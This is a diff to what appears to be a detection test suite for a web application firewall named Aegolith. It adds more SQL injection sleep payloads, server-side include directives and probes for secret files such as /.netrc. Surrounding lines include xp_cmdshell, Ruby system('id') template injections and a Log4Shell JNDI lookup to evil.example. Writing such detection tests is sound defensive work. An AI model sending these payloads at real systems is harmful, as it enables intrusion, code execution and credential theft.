@@ -91,6 +91,11 @@ form $A sqli "commented waitfor in form" "email=x';WAITFOR/**/DELAY/**/'0:0:5'--
 q $A sqli "xp_cmdshell via master"     "exec master..xp_cmdshell 'ipconfig /all'"
 json $A sqli "pg_sleep call in json"   '{"note":"pg_sleep(5)"}'
 q $A sqli "oracle dbms_lock sleep"     "DBMS_LOCK . SLEEP(5)"
+# Aegolith (alpha.6 final review): the other AEG-SQLI-002 tokens.
+q $A sqli "postgres pg_sleep_for"      "pg_sleep_for('5 seconds')"
+q $A sqli "postgres pg_sleep_until"    "1;select pg_sleep_until(now()+'5 seconds')"
+q $A sqli "oracle dbms_session sleep"  "DBMS_SESSION.SLEEP(5)"
+q $A sqli "waitfor time"               "WAITFOR TIME '23:59:59'"
 
 # --- 2. Cross-site scripting -----------------------------------------------------------------------------------
 q $A xss "script tag"                  "<script>alert(1)</script>"
@@ -215,6 +220,9 @@ q $A ssti "ssi set variable"            '<!--#set var="a" value="b" -->'
 q $A ssti "ruby call around nested data path" '#{system("id #{a.b}")}'
 json $A ssti "ruby call around nested number" '{"note":"#{system(\"id #{1}\")}"}'
 q $A ssti "jinja safe filter in a conditional" "{{ x|safe if a else b }}"
+# Aegolith (alpha.6 final review): the other SSI directives.
+q $A ssti "ssi fsize"                  '<!--#fsize file="index.html" -->'
+q $A ssti "ssi flastmod"               '<!--#flastmod virtual="/index.html" -->'
 
 # --- 7. Log4Shell / JNDI ---------------------------------------------------------------------------------------
 hdr $A log4shell "jndi in user-agent"  User-Agent "\${jndi:ldap://evil.example/a}"
@@ -304,6 +312,9 @@ hdr $A scanner "qualys was"            User-Agent "Mozilla/5.0 (Qualys WAS)"
 hdr $A scanner "vega"                  User-Agent "Vega/1.0"
 # Aegolith (alpha.6): a root package-manager secret file and the other scanner agents added in alpha.6.
 path $A scanner "npmrc at root"        "/.npmrc"
+# Aegolith (alpha.6 final review): the other VCS directory and secret file.
+path $A scanner "bzr directory"        "/.bzr/branch-format"
+path $A scanner "netrc at root"        "/.netrc"
 hdr $A scanner "w3af"                  User-Agent "w3af.org"
 hdr $A scanner "webinspect"            User-Agent "Mozilla/5.0 (compatible; WebInspect)"
 hdr $A scanner "havij"                 User-Agent "Havij"
